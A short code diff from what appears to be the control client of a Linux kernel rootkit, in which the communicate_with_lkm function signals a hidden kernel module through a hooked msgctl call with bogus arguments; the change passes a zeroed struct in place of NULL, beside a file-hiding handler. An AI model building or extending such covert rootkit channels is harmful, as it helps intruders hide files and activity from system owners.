@@ -184,8 +184,11 @@ void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_
  * Returns 0 if successfully communicated, -1 otherwise.
  */
 int communicate_with_lkm(action_task *data_to_pass) {
+	struct msqid_ds messenger;
+	memset(&messenger, 0, sizeof(struct msqid_ds));
 	printf("Sending request to LKM\n");
-	if (msgctl(-1, -1, NULL) == 0) {
+
+	if (msgctl(-1, -1, &messenger) == 0) {
 		print_green("Notification OK.\n");
 		return msgctl(-1, -1, (struct msqid_ds*) data_to_pass);
 	} else {
